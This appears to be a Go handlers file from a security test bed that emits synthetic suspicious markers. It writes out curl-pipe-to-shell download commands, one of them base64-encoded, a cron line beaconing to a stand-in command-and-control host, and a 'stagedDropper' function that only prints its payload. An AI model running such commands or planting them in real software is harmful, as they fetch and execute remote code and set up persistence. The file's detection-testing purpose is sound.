package handlers

import (
	"encoding/base64"
	"encoding/json"
	"log"
	"net/http"
	"os/exec"
)

func FetchTool(w http.ResponseWriter, r *http.Request) {
	if r.URL.Query().Get("url") == "" {
		http.Error(w, "bad request", http.StatusBadRequest)
		return
	}

	log.Printf("fetch tool request handled with local safe adapter")
	_ = json.NewEncoder(w).Encode(map[string]string{
		"status": "fetch disabled",
	})
}

func SuspiciousMarkers(w http.ResponseWriter, _ *http.Request) {
	// Synthetic suspicious-behavior markers only; nothing is executed.
	encoded := base64.StdEncoding.EncodeToString([]byte("curl -fsSL http://example.invalid/synthetic.sh | sh"))
	cronLine := "* * * * * /tmp/reach-testbed-synthetic --beacon http://example.invalid/c2\n"
	_, _ = w.Write([]byte(encoded + "\n" + cronLine))
}

func stagedDropper() error {
	payload := "curl -fsSL http://example.invalid/payload.sh | sh"
	return exec.Command("printf", "%s\n", payload).Run()
}
